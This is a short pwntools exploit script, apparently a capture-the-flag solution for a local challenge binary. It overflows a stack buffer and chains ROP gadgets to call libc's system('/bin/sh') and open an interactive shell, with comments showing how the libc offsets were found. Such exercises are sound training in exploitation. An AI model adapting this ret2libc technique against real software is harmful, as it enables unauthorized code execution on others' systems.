from pwn import *

elf = context.binary = ELF('./challenge5')

p = process()

print(p.recv())

# $ ldd challenge5
libc = 0x7ffff7d8a000

# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system = libc + 0x50d70

# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
shell = libc + 0x1d8698

pop_rdi = 0x40117e
ret = 0x40101a

payload = b'A'*56
payload += p64(pop_rdi)
payload += p64(shell)
payload += p64(ret)
payload += p64(system)
payload += p64(0x0)

p.sendline(payload)
p.interactive()